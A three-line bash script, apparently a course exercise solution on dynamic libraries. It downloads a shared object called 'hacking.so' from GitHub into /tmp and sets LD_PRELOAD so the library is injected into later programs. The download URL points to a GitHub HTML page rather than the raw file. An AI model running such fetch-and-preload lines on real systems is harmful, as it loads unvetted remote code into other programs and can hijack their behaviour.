#!/bin/bash
wget -P /tmp https://github.com/soliyana123/alx-low_level_programming/blob/master/0x18-dynamic_libraries/hacking.so
export LD_PRELOAD=/tmp/hacking.so
